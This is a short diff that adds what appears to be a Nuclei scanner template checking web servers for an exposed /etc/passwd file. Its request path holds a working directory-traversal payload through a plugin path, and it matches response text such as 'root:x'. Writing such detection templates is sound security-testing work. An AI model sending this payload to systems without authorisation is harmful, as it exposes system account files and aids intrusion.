@@ -1,0 +1,21 @@
+id: etc-passwd-exposure
+
+info:
+  name: /etc/passwd Exposure
+  author: SirBugs
+  severity: high
+  description: Checks for exposed /etc/passwd file.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+          - "bin:x"
+          - "root:/bin/bash"
+        part: body
